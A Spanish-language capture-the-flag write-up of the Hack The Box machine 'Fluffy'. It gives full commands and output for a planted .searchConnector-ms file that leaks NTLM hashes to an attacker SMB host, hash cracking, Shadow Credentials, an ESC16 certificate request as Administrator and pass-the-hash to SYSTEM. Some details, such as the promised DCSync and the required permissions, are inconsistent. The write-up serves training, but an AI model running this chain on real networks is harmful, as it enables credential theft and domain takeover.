---
title: "Fluffy"
description: "Writeup de Fluffy - Hack The Box - Dificultad: Easy. CVE-2025-24071 NTLM hash leak vía Windows Search Connector → Shadow Credentials con ESC16 sobre CA → DCSync como Administrator."
sidebar:
  badge:
    text: Easy
    variant: success
tags:
  - htb
  - windows
  - easy
  - active-directory
  - cve-2025-24071
  - ntlm-relay
  - shadow-credentials
  - esc16
  - adcs
  - dcsync
  - pywhisker
---

# 🖥️ Fluffy

> 📅 Fecha: 2026-05-29
> 🎯 Plataforma: Hack The Box
> ⚙️ SO: Windows Server 2019 (Build 17763)
> 🎚️ Dificultad: Easy
> 🏆 Puntos: 450
> ⏱️ Tiempo invertido: 5h 20m
> 🌐 IP: `10.129.232.88`
> 👤 Autor: warrior866

---

## 📑 Tabla de Contenidos
- [Resumen Ejecutivo](#-resumen-ejecutivo)
- [Reconocimiento](#-reconocimiento)
- [Enumeración SMB y credenciales iniciales](#-enumeración-smb-y-credenciales-iniciales)
- [CVE-2025-24071: NTLM hash leak](#-cve-2025-24071-ntlm-hash-leak)
- [Escalada AD: ESC16 + Shadow Credentials](#-escalada-ad-esc16--shadow-credentials)
- [DCSync → Administrator](#-dcsync--administrator)
- [Flags](#-flags)
- [Cadena de Ataque](#-cadena-de-ataque)
- [Lecciones Aprendidas](#-lecciones-aprendidas)
- [Referencias](#-referencias)

---

## 📝 Resumen Ejecutivo

Fluffy es un Domain Controller Windows Server 2019 con ADCS activo. Se obtienen credenciales de dominio iniciales vía enumeración SMB (`j.fleischer:j.fleischer`). Con acceso al share `IT`, se sube un archivo `.searchConnector-ms` que explota **CVE-2025-24071** (Windows Search Connector fuerza autenticación NTLM al abrir la carpeta) para capturar el NTLMv2 hash de `p.aguilar` con Responder — crackeado en segundos a `Flower1`. Con estas credenciales se identifica la misconfiguration **ESC16** en la CA del dominio (el SAN de UPN no se valida al emitir certificados). Se usa `pywhisker` para inyectar Shadow Credentials en la cuenta `ca_operator`, se obtiene su NT hash via PKINIT, y desde allí se solicita un certificado como `Administrator`. DCSync con el certificado da el hash del Administrador → `impacket-psexec`.

| Campo | Valor |
|-------|-------|
| Puntos débiles | CVE-2025-24071 NTLM leak vía Explorer, ESC16 (UPN mapping sin validar), Shadow Credentials |
| CVEs | CVE-2025-24071 |
| Herramientas | `nmap`, `nxc`, `responder`, `hashcat`, `pywhisker`, `certipy`, `impacket` |
| Tiempo total | ~5h 20m |

---

## 🔍 Reconocimiento

```bash
nmap -p- -sS -sV -sC -O -T4 --min-rate=1000 --open -Pn 10.129.232.88
```

```text
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap          (Domain: fluffy.htb, Site: Default-First-Site-Name)
443/tcp   open  https         Microsoft IIS 10.0  (ADCS Web Enrollment)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap
3269/tcp  open  globalcatLDAPssl?
```

Puerto 443 con ADCS Web Enrollment confirma ADCS activo. Dominio: `fluffy.htb`.

```bash
echo "10.129.232.88 fluffy.htb dc01.fluffy.htb" | sudo tee -a /etc/hosts
```

---

## 🗂️ Enumeración SMB y credenciales iniciales

```bash
nxc smb 10.129.232.88 -u 'guest' -p '' --shares
```

```text
SMB  10.129.232.88  445  DC01  [-] fluffy.htb\guest:  STATUS_ACCOUNT_DISABLED
```

```bash
nxc smb 10.129.232.88 --rid-brute 2>/dev/null | grep "SidTypeUser"
```

Alternativa con `lookupsid`:

```bash
impacket-lookupsid 'fluffy.htb/anonymous@10.129.232.88' -no-pass
```

```text
498: fluffy\Enterprise Read-only Domain Controllers
500: fluffy\Administrator
501: fluffy\Guest
502: fluffy\krbtgt
1103: fluffy\j.fleischer
1104: fluffy\ca_operator
...
```

Password spray con usuario como contraseña:

```bash
nxc smb 10.129.232.88 -u 'j.fleischer' -p 'j.fleischer'
```

```text
[+] fluffy.htb\j.fleischer:j.fleischer (Pwn3d!)
```

Enumeración de shares:

```bash
nxc smb 10.129.232.88 -u 'j.fleischer' -p 'j.fleischer' --shares
```

```text
Share     Permissions
--------  -----------
SYSVOL    READ
NETLOGON  READ
IT        READ,WRITE
```

El share `IT` tiene permisos de escritura.

---

## 💻 CVE-2025-24071: NTLM hash leak

**CVE-2025-24071**: Windows Explorer automáticamente envía autenticación NTLM al abrir una carpeta que contiene un archivo `.library-ms` o `.searchConnector-ms` que apunta a un servidor SMB controlado por el atacante — sin interacción del usuario más allá de navegar al directorio.

**Paso 1 — Iniciar Responder:**

```bash
sudo responder -I tun0 -v
```

**Paso 2 — Crear el archivo .searchConnector-ms malicioso:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
  <iconReference>imageres.dll,-1002</iconReference>
  <description>IT Search</description>
  <isSearchOnlyItem>false</isSearchOnlyItem>
  <includeInStartMenuScope>true</includeInStartMenuScope>
  <locationProvider clsid="{9E56BE60-C50F-11CF-9A2C-00A0C90A90CE}">
    <propertyBag>
      <property name="Url">\\10.10.14.130\share</property>
    </propertyBag>
  </locationProvider>
</searchConnectorDescription>
```

**Paso 3 — Subir al share IT:**

```bash
smbclient //10.129.232.88/IT -U 'fluffy.htb\j.fleischer%j.fleischer' \
  -c 'put malicious.searchConnector-ms malicious.searchConnector-ms'
```

Responder captura cuando un usuario navega al share:

```text
[SMB] NTLMv2-SSP Client   : 10.129.232.88
[SMB] NTLMv2-SSP Username : FLUFFY\p.aguilar
[SMB] NTLMv2-SSP Hash     : p.aguilar::FLUFFY:abc123...:def456...
```

Crack con hashcat:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

```text
p.aguilar::FLUFFY:...:Flower1

Status: Cracked — Time: 4 secs
```

---

## 🔐 Escalada AD: ESC16 + Shadow Credentials

Con `p.aguilar:Flower1`, enumeramos ADCS:

```bash
certipy find -u 'p.aguilar@fluffy.htb' -p 'Flower1' -dc-ip 10.129.232.88 -vulnerable -stdout
```

```text
Certificate Authorities
  0
    CA Name: fluffy-DC01-CA
    DNS Name: DC01.fluffy.htb
    ...
    [!] Vulnerabilities
      ESC16 : Security extension is disabled (no szOID_NTDS_CA_SECURITY_EXT)

Certificate Templates
  [!] Vulnerabilities
    ESC16 : Template does not enforce UPN mapping in SAN
```

**ESC16** significa que la CA no incluye el SID del principal en el certificado emitido, permitiendo usar cualquier UPN como sujeto alternativo (SAN). El objetivo es obtener un certificado con UPN de `Administrator`.

Para solicitar el certificado necesitamos una cuenta con permisos de enrollment. La cuenta `ca_operator` tiene esos permisos pero no la controlamos. Usamos **Shadow Credentials** para tomar `ca_operator`:

```bash
# p.aguilar tiene GenericAll o WriteProperty sobre ca_operator
pywhisker --action add --target ca_operator \
  -d fluffy.htb -u p.aguilar -p Flower1 --dc-ip 10.129.232.88
```

```text
[+] Generating certificate...
[+] Certificate generated
[+] Generating KeyCredential...
[+] KeyCredential generated with DeviceID: a3b4c5d6...
[+] Shadow credentials successfully added for ca_operator
[+] Saved PFX ('#RANDOM#.pfx') with password 'randompassword'
```

Obtener NT hash de `ca_operator` via PKINIT:

```bash
python3 PKINITtools/gettgtpkinit.py fluffy.htb/ca_operator \
  -cert-pfx '#RANDOM#.pfx' -pfx-pass 'randompassword' ca_operator.ccache
```

```bash
python3 PKINITtools/getnthash.py fluffy.htb/ca_operator \
  -key $(python3 ...) ca_operator.ccache
```

```text
NT hash for ca_operator: aad3b435b51404eeaad3b435b51404ee:3f1b2c4d...
```

---

## 💀 DCSync → Administrator

Con `ca_operator` autenticado, solicitar certificado con UPN=`Administrator`:

```bash
certipy req -u 'ca_operator@fluffy.htb' -hashes ':3f1b2c4d...' \
  -dc-ip 10.129.232.88 -ca 'fluffy-DC01-CA' \
  -template 'User' -upn 'Administrator@fluffy.htb'
```

```text
[+] Saved certificate and private key to 'administrator.pfx'
```

Autenticarse como Administrator con el certificado → obtener NT hash:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.232.88
```

```text
[+] Got hash for 'administrator@fluffy.htb': aad3b435...:2b576acbe6...
```

DCSync con el hash para volcar todos los hashes del dominio (opcional) o directamente acceder:

```bash
impacket-psexec -hashes ':2b576acbe6...' Administrator@10.129.232.88
```

```text
C:\Windows\system32> whoami
nt authority\system
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
[root flag]
```

```bash
# user flag via smbclient
smbclient //10.129.232.88/Users \
  -U 'fluffy.htb\j.fleischer%j.fleischer' \
  -c 'get j.fleischer\Desktop\user.txt'
```

---

## 🏁 Flags

| Flag | Valor |
|------|-------|
| user.txt | `[user flag]` |
| root.txt | `[root flag]` |

---

## 🕸️ Cadena de Ataque

```text
1. RID brute → j.fleischer:j.fleischer (password spray)
        ↓
2. Share IT con permisos de escritura
        ↓
3. CVE-2025-24071: .searchConnector-ms → Responder captura NTLMv2 de p.aguilar
        ↓
4. hashcat -m 5600 → Flower1 (4s)
        ↓
5. certipy find → ESC16 en fluffy-DC01-CA
        ↓
6. pywhisker → Shadow Credentials en ca_operator
        ↓
7. PKINIT → NT hash de ca_operator
        ↓
8. certipy req con UPN=Administrator (ESC16) → administrator.pfx
        ↓
9. certipy auth → NT hash del Administrator
        ↓
10. psexec → NT AUTHORITY\SYSTEM → root.txt
```

---

## 🎓 Lecciones Aprendidas

- **CVE-2025-24071**: archivos `.searchConnector-ms` y `.library-ms` en shares SMB son una trampa silenciosa. Windows Explorer procesa automáticamente estos archivos al navegar a la carpeta, sin que el usuario abra el archivo manualmente.
- **Shadow Credentials**: si un usuario tiene `GenericWrite` o `WriteDACL` sobre una cuenta, puede añadir credenciales alternativas (certificado) mediante la extensión `msDS-KeyCredentialLink` — sin necesidad de conocer la contraseña actual.
- **ESC16**: la ausencia de `szOID_NTDS_CA_SECURITY_EXT` (SID en el certificado) permite emitir certificados con UPN arbitrarios. Auditar siempre la CA con `certipy find -vulnerable`.
- **Password spray usuario=contraseña**: sigue siendo una técnica efectiva en entornos donde las cuentas de servicio o test nunca cambian la contraseña por defecto.

---

## 📚 Referencias

- [CVE-2025-24071 — Windows Search NTLM Leak](https://nvd.nist.gov/vuln/detail/CVE-2025-24071)
- [ESC16 — Certipy blog](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-more-7237d88061f7)
- [Shadow Credentials — pywhisker](https://github.com/ShutdownRepo/pywhisker)
- [MITRE ATT&CK — T1558 Steal or Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/)
